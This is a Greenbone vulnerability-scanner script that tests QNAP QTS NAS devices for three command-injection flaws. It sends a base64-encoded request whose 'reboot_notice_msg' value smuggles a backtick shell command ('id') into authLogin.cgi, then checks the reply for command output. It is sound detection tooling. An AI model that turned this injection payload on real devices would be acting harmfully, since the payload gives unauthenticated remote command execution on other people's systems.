CPE_PREFIX = "cpe:/h:qnap";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140297" );
	script_version( "2021-09-09T08:01:35+0000" );
	script_tag( name: "last_modification", value: "2021-09-09 08:01:35 +0000 (Thu, 09 Sep 2021)" );
	script_tag( name: "creation_date", value: "2017-08-15 08:57:34 +0700 (Tue, 15 Aug 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_cve_id( "CVE-2017-6359", "CVE-2017-6360", "CVE-2017-6361" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "QNAP QTS Multiple Arbitrary Command Execution Vulnerabilities (Remote)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_qnap_nas_detect.sc" );
	script_mandatory_keys( "qnap/qts" );
	script_tag( name: "summary", value: "QNAP QTS is prone to multiple vulnerabilities." );
	script_tag( name: "insight", value: "QNAP QTS is prone to multiple vulnerabilities:

  - Command Injection in utilRequest.cgi cancel_trash_recovery 'pid'. (CVE-2017-6359)

  - Command Injection in userConfig.cgi cloudPersonalSmtp 'hash'. (CVE-2017-6360)

  - Command Injection in authLogin.cgi 'reboot_notice_msg' (CVE-2017-6361)" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "affected", value: "QNAP QTS prior to 4.2.4 Build 20170313." );
	script_tag( name: "solution", value: "Update to QNAP QTS  4.2.4 Build 20170313 or newer." );
	script_xref( name: "URL", value: "https://www.qnap.com/en-us/releasenotes/" );
	script_xref( name: "URL", value: "https://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
port = infos["port"];
CPE = infos["cpe"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
date = unixtime() % 100000000;
msg = "QNAPVJBD0" + date + "      Disconnect  14`(echo;id)>&2`";
msg = base64( str: msg );
url = dir + "/cgi-bin/authLogin.cgi?reboot_notice_msg=" + msg;
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "uid=[0-9]+.*gid=[0-9]+" )){
	uid = eregmatch( pattern: "uid=[0-9]+.*gid=[0-9]+.*,[0-9]+\\([a-zA-Z]+\\)", string: res );
	report = "It was possible to execute the 'id' command.\\n\\nResult: " + uid[0] + "\\n";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

